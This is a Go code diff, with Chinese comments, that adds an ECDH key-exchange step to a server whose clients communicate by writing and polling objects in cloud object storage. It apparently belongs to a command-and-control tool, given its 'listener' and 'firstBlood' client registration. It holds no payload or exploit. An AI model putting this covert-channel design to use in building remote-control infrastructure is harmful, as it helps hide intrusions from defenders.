@@ -139,6 +139,19 @@ func HandleOSSConnection(client *Client, stopKey string, masterKey, salt []byte,
 		}
 	}
 }
+
+// msgTypeOSS_KX 会话前 ECDH 交换的消息类型（与客户端 kxMsgType 一致）
+const msgTypeOSS_KX = 200
+
+// uidFromObjectKey 从对象键里取 uid 前缀。
+// 客户端上传的键形如 "<uid>/client_..."、"<uid>/client_kx_..."、
+// "<uid>/client_TS"，uid 是 MD5(MetaInfo 明文)，不依赖任何密钥，故 KX 阶段可用。
+func uidFromObjectKey(name string) string {
+	if i := strings.Index(name, "/"); i > 0 {
+		return name[:i]
+	}
+	return name
+}
 func process_server(c *Client, stopKey, name string, masterKey, salt []byte) {
 
 	message := Get(c, name)
@@ -156,6 +169,34 @@ func process_server(c *Client, stopKey, name string, masterKey, salt []byte) {
 	msgTypeBytes := message[:4]
 	msgType := binary.BigEndian.Uint32(msgTypeBytes)
 	switch msgType {
+	case msgTypeOSS_KX: // 会话前 ECDH 交换（阶段一 1c）
+		// 载荷 = 32 字节原始公钥（客户端 send 会整体 base64，Get 已解回原始字节）
+		if len(message) < 4+encrypt.ECDHPublicKeySize {
+			logx.Warnf("⚠️ [OSS-KX] 载荷过短: %d\n", len(message))
+			return
+		}
+		peerPub := message[4 : 4+encrypt.ECDHPublicKeySize]
+		// uid 从对象键前缀取（客户端用 <uid>/client_kx_* 命名）：
+		// 此时 MetaInfo 还没解开，只能靠键名关联，这也是本传输独有的约束。
+		uidFromKey := uidFromObjectKey(name)
+		srv, err := encrypt.NewServerKeyExchange()
+		if err != nil {
+			return
+		}
+		mk, err := srv.DeriveMasterKey(peerPub, salt)
+		if err != nil {
+			logx.Warnf("⚠️ [OSS-KX] 派生失败: %v\n", err)
+			return
+		}
+		if _, err := encrypt.GlobalKxCache.Put(peerPub, mk); err != nil {
+			return
+		}
+		encrypt.GlobalKxCache.Bind(peerPub, uidFromKey)
+		// 响应通过"服务端写对象、客户端轮询取回"这条既有通道回传
+		respName := uidFromKey + fmt.Sprintf("/kxresp_%020d", time.Now().UnixNano())
+		Send(c, respName, srv.PublicKey())
+		logx.Infof("🔑 [OSS-KX] 完成会话前密钥交换（uid=%s）\n", uidFromKey)
+		return
 	case 1: //firstBlood
 		msg := message[4:]
 		tmpMetainfo, err := encrypt.DecodeBase64(msg)
@@ -164,6 +205,12 @@ func process_server(c *Client, stopKey, name string, masterKey, salt []byte) {
 			return
 		}
 		metaMK, metaSalt := masterKey, salt
+		// 若该 uid 已完成 KX 交换，必须用派生主密钥解 MetaInfo：
+		// 客户端此时用派生密钥加密，继续用静态密钥只会"解密失败"，
+		// 而现象只是"OSS 客户端注册不上"。
+		if kxMK, ok := encrypt.GlobalKxCache.LookupByUID(uidFromObjectKey(name)); ok {
+			metaMK = kxMK
+		}
 		// J4: 拒绝公开默认密钥连接
 		if encrypt.IsDefaultListenerKey(metaMK, metaSalt) {
 			logx.Warnf("⚠️ [OSS-FIRSTBLOOD] 监听器使用公开默认密钥，拒绝连接\n")
